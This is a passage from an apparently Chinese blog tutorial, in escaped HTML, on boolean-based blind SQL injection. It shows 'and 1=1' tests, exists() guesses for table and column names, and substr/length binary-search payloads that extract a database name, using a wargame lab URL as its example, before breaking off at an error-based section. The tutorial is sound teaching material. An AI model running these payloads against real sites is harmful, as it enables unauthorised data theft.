			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select * from students where id = 10056 or FALSE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
+-------+-------+-----+
1 row in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3275707838647-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3275707838647-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3275707838647-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3275707838647-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3275707838647-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3275707838647-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3275707838647-7&quot;&gt;7&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3275707838647-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;select *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3275707838647-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3275707838647-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3275707838647-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3275707838647-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10056&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Doris&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3275707838647-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3275707838647-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;row &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0020 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;div&gt;
&lt;p&gt;&lt;strong&gt;会发现and 1=1 , and 1=2 即是 and TRUE , and FALSE 的变种。&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;这便是最基础的boolean注入,以此为基础你可以自由组合语句。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;字典爆破流&lt;/p&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3278371389065&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
and exists(select * from ?)     //?为猜测的表名
and exists(select ? from x)     //?为猜测的列名&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3278371389065-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3278371389065-2&quot;&gt;2&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3278371389065-1&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;select *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//?为猜测的表名&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3278371389065-2&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//?为猜测的列名&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0007 seconds] --&gt;
&lt;p&gt;截取二分流&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c327b588908800&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
and (length((select schema_name from information_schema.schemata limit 1))&amp;gt;?)       //判断数据库名的长度
and (substr((select schema_name from information_schema.schemata limit 1),1,1)&amp;gt;&#39;?&#39;)
and (substr((select schema_name from information_schema.schemata limit 1),1,1)&amp;lt;&#39;?&#39;)      //利用二分法判断第一个字符&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c327b588908800-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c327b588908800-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c327b588908800-3&quot;&gt;3&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c327b588908800-1&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;schema_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;schemata &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//判断数据库名的长度&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c327b588908800-2&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;schema_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;schemata &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c327b588908800-3&quot;&gt;
&lt;span class=&quot;crayon-st&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;schema_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;schemata &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;?&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//利用二分法判断第一个字符&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0016 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3 id=&quot;Boolean-based总结&quot;&gt;Boolean-based总结&lt;/h3&gt;
&lt;p&gt;根据前面的介绍，我们知道，对于基于Boolean-based的注入，&lt;strong&gt;必须要有一个可以正常访问的地址&lt;/strong&gt;，比如http: //redtiger.labs.overthewire.org/level4.php?id=1 是一个可以正常访问的记录，说明id=1的记录是存在的，下面的都是基于这个进一步猜测。先来判断一个关键字keyword的长度，在后面构造&lt;strong&gt;id=1 and (select length(keyword) from table)=1&lt;/strong&gt;，从服务器我们会得到一个返回值，如果和先前的返回值不一样，说明and后面的&lt;strong&gt;(select length(keyword) from table)=1返回false&lt;/strong&gt;，keyword的长度不等于1。继续构造直到id=1 and (select length(keyword) from table)=15返回true，说明keyword的长度为15。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为什么我们刚开始一定要找一个已经存在的id，其实这主要是为了构造一个为真的情况。Boolean-based就是利用查询结果为真和为假时的不同响应，通过不断猜测来找到自己想要的东西。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于keyword的值，mysql数据库可以使用substr(string, start, length)函数，截取string从第start位开始的length个字符串id=1 and (select substr(keyword,1,1) from table) =’A’，依此类推，就可以获得keyword的在数据库中的值。&lt;br&gt;
Boolean-based的效率很低，需要多个请求才能确定一个值，尽管这种代价可以通过脚本来完成，在有选择的情况下，我们会优先选择其他方式。&lt;/p&gt;
&lt;h2 id=&quot;Error-Based-原理分析&quot;&gt;Error Based 原理分析&lt;/h2&gt;
&lt;h3 id=&quot;关于错误回显&quot;&gt;关于错误回显&lt;/h3&gt;
&lt;p&gt;基于错误回显的sql注入就是&lt;strong&gt;通过sql语句的矛盾性来使数据被回显到页面上&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;所用到的函数&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

